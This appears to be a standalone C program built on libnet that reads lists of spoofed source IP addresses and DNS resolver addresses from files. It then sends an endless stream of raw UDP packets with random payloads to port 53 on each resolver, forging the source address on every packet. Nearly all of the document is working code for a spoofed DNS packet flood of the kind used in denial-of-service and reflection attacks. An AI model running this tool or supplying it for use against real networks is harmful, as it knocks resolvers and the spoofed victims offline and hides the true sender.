/*
 *  $Id$
 *
 *  Send random data in a UDP packet with dst port 53. 
 *
 */

#include <libnet.h>
#define MAXLINES 10000

int main(int argc, char *argv[])
{
    int c, i; 
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t ip;
    libnet_ptag_t udp;
    struct libnet_stats ls;
    u_long nround; 
    u_long src_ip, dst_ip;
    u_short src_prt, dst_prt;
    u_char opt[20];
    char errbuf[LIBNET_ERRBUF_SIZE];
    FILE *dmf, *nsf, *srcf;
    char dms[600], *nss[MAXLINES], *srcs[MAXLINES];
    int pay_s;
    char *nsfn = "ns.txt";
    char *srcfn = "src.txt";
    char *paybuf, *pp;
    int jd = 0;
    int jn = 0;
    int js = 0;
    int kd, kn;
    u_long delay = 20; /* microsec */
    u_char bt;
    char lb[80];
    char linebuf[80];
    char payld[100], tpayld[100];

/* get the specified delay */
   if ( getopt(argc, argv, "d:") == 'd')
     delay = atoi(optarg);   
       
/* Read the domains and DNS IPs, and construct DNS palyload */ 

    if( (nsf = fopen(nsfn, "r")) == NULL) {
      fprintf(stderr, "Error opening file %s \n", nsfn); 
      exit(1);
    } /* end if */ 
 
    if( (srcf = fopen(srcfn, "r")) == NULL) {
      fprintf(stderr, "Error opening file %s \n", srcfn); 
      exit(1);
    } /* end if */ 
 
 
    js=0; 
    printf("Reading spoofed source IPs ... \n");
    while ((js < MAXLINES) && (fgets(lb, 80, srcf)!=0) )  {
       kd = 0; 
       kn = 0;
       while (lb[kd] != '\0') {        /* get rid of space and CR */
        if ((lb[kd] != ' ') && (lb[kd] != '\n')) {
           linebuf[kn] = lb[kd];
           kn++;
        }  /* end if */
        kd++; 
       } /* end while */
       linebuf[kn] = '\0'; 
       if (kn != 0) { /* not empty line */ 
         srcs[js] = (char *)malloc(strlen(linebuf)+1); 
         strcpy(srcs[js++], linebuf); 
         /* printf("%s\n", srcs[js-1]); */
       } /* end if */   
    } /* end while  */
   
    printf("Total source IPs: %d\n", js); 
    fclose(srcf);
    
    jn = 0; 
    printf("Reading resolver IPs ... \n");
    while ((jn < MAXLINES) && (fgets(lb, 80, nsf)!=0) )  {
       kd = 0;
       kn = 0;
       while (lb[kd] != '\0') {        /* get rid of space and CR */
        if ((lb[kd] != ' ') && (lb[kd] != '\n')) {
           linebuf[kn] = lb[kd];
           kn++;
        }  /* end if */
        kd++;
       } /* end while */
       linebuf[kn] = '\0';
       if (kn != 0) { /* not empty line */
         nss[jn] = (char *)malloc(strlen(linebuf)+1);
         strcpy(nss[jn++], linebuf);
         /*  printf("%s\n", nss[jn-1]); */
       } /* end if */  
    } /* end while  */
  
    printf("Total DNS IPs: %d\n", jn);
    fclose(nsf);

nround = 0; 
while(1) {   /* non-stop sending ... */
    /* Initialize the library.  Root priviledges are required.  */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);
    udp = 0; 
    ip = 0;

   for(kn=0; kn < jn; kn++) {  /* loop over all DNS IPs */ 

   if ((dst_ip = inet_addr(nss[kn])) == -1) {
        fprintf(stderr, "Bad DNS IP address: %s\n", nss[kn]);
        exit(EXIT_FAILURE);
   }  /* end if */

    /* printf("feeding %s for domain %s ...\n", nss[kn], dms[kd]);  */
    i = (int)(libnet_get_prand(LIBNET_PRu16)/65535.0*(js-1));  /* Randsrc ip */
    src_ip = inet_addr(srcs[i]); /* real ip */ 
    /* printf("using source IP %s ...\n", srcs[i]);   */
    src_prt = libnet_get_prand(LIBNET_PRu16);    /* Random source port */
    dst_prt = 53;			         /* DNS */		 

/*  get a random pay_s < 512 */
    pay_s = (int)(libnet_get_prand(LIBNET_PRu16)/128);  
    for (i=0; i < 512; i++) {
     dms[i] = (char)(libnet_get_prand(LIBNET_PRu16)/256);  /* fill with rand c*/
    }

/* Building UDP */
        udp = libnet_build_udp(
            src_prt,                                /* source port */
            dst_prt,                            /* destination port */
            LIBNET_UDP_H + pay_s,   /* packet length */
            0,                                      /* checksum */
            dms,                                /* payload */
            pay_s,                              /* payload size */
            l,                                      /* libnet handle */
            udp);                                   /* libnet id */

        if (udp == -1) {
            fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
            goto bad;
        }

/* Building IP */
            
            ip = libnet_build_ipv4(
                LIBNET_IPV4_H + pay_s + LIBNET_UDP_H, /* length */
                0x00,                                          /* TOS */
                0,                                            /* IP ID */
                0x0000,                                          /* IP Frag */
                64,                                         /* TTL */
                IPPROTO_UDP,                                /* protocol */
                0,                                          /* checksum */
                src_ip,
                dst_ip,
                NULL,                                       /* payload */
                0,                                          /* payload size */
                l,                                          /* libnet handle */
                ip);                                         /* libnet id */

            if (ip == -1) {
             fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
             goto bad;
            }

/*  Write it to the wire. */
        c = libnet_write(l);
        if (c == -1) { 
            fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
            goto bad;
        } else {
            /* printf("Wrote %d byte UDP packet; check the wire.\n", c); */
        }
 
   /* printf("Delaying %d microsec between each packet ... \n", delay); */
   } /* end for */ 

    libnet_stats(l, &ls);
    fprintf(stderr, "Packets sent:  %ld\n"
                    "Packet errors: %ld\n"
                    "Bytes written: %ld\n",
                    ls.packets_sent, ls.packet_errors, ls.bytes_written);
    libnet_destroy(l);

 usleep(delay);  /* slow down to conserve bandwidth */
 nround++;
 printf("====== Round %ld sent ================\n", nround); 
}  /* end of while loop */
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}

